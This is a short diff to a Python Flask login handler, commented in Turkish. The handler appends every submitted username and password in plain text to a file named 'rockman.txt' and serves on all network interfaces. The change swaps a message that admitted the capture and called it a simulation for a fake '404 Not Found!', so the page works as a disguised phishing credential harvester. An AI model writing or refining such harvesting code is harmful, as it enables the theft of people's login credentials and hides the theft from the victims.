@@ -27,7 +27,7 @@ def login():
     # Kullanıcı giriş bilgilerini dosyaya kaydeder
     with open('rockman.txt', 'a') as file:
         file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
-    return 'Bilgiler kaydedildi ve sayfa bulunamadı! (Simülasyon)'
+    return '404 Not Found!'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
